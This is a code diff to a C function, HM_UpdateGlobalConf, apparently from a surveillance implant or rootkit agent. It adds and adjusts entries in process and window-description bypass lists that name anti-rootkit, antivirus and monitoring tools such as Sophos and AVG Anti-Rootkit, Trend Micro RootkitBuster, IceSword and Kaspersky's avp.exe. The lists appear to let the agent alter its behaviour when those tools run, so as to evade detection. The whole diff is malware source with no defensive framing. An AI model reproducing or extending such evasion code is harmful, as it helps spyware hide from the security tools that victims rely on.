@@ -2374,15 +2374,15 @@ void HM_UpdateGlobalConf()
 	strcpy(process_bypass_list[13],"taskmgr.exe");
 	strcpy(process_bypass_list[14],"avgscanx.exe");
 	strcpy(process_bypass_list[15],"IceSword.exe");
-	strcpy(process_bypass_list[16],"svv.exe");
+	//strcpy(process_bypass_list[16],"svv.exe");
 	strcpy(process_bypass_list[17],"rku*.exe");
 	strcpy(process_bypass_list[18],"pavark.exe");
 	strcpy(process_bypass_list[19],"avp.exe");
 	strcpy(process_bypass_list[20],"bgscan.exe");
-	strcpy(process_bypass_list[21],"admin.exe");
+	//strcpy(process_bypass_list[21],"admin.exe");
 	strcpy(process_bypass_list[22],"avk.exe");
 	strcpy(process_bypass_list[23],"k7*.exe");
-	strcpy(process_bypass_list[24],"rootkitbuster.exe");
+	strcpy(process_bypass_list[24],"rootkitbuster*.exe");
 	strcpy(process_bypass_list[25],"pcts*.exe");
 	strcpy(process_bypass_list[26],"iexplore.exe");
 	strcpy(process_bypass_list[27],"chrome.exe");
@@ -2397,29 +2397,15 @@ void HM_UpdateGlobalConf()
 	wcscpy(process_bypass_desc[5],L"*Hidden*Process*Finder*");
 	wcscpy(process_bypass_desc[6],L"Detects*rootkits*");
 	wcscpy(process_bypass_desc[8],L"*Secure*BlackLight*");
-
+	wcscpy(process_bypass_desc[9],L"Sophos Anti*Rootkit*");
+	wcscpy(process_bypass_desc[10],L"AVG Anti*Rootkit*");
+	wcscpy(process_bypass_desc[12],L"Rootkit detection utility*");
+	wcscpy(process_bypass_desc[18],L"*pavark*");
+	wcscpy(process_bypass_desc[24],L"Trend Micro RootkitBuster*");
 	wcscpy(process_bypass_desc[26],L"*Internet Explorer*");
-	wcscpy(process_bypass_desc[27],L"*Google Chrome*");
-
+	wcscpy(process_bypass_desc[27],L"*Google*Chrome*");
+	wcscpy(process_bypass_desc[28],L"*F-Secure Settings*");
 	
-/*	
-	wcscpy(process_bypass_desc[9],L"sargui.exe");
-	wcscpy(process_bypass_desc[10],L"avgarkt.exe");
-	wcscpy(process_bypass_desc[11],L"avscan.exe");
-	wcscpy(process_bypass_desc[12],L"RootkitRevealer.exe");
-	wcscpy(process_bypass_desc[15],L"IceSword.exe");
-	wcscpy(process_bypass_desc[16],L"svv.exe");
-	wcscpy(process_bypass_desc[17],L"rku*.exe");
-	wcscpy(process_bypass_desc[18],L"pavark.exe");
-	wcscpy(process_bypass_desc[19],L"avp.exe");
-	wcscpy(process_bypass_desc[20],L"bgscan.exe");
-	wcscpy(process_bypass_desc[21],L"admin.exe");
-	wcscpy(process_bypass_desc[22],L"avk.exe");
-	wcscpy(process_bypass_desc[23],L"k7*.exe");
-	wcscpy(process_bypass_desc[24],L"rootkitbuster.exe");
-	wcscpy(process_bypass_desc[25],L"pcts*.exe");
-	wcscpy(process_bypass_desc[28],L"fsm32.exe");*/
-
 	// Legge il delta date dal file di stato...
 	Log_RestoreAgentState(PM_CORE, (BYTE *)&date_delta, sizeof(date_delta)); 
 
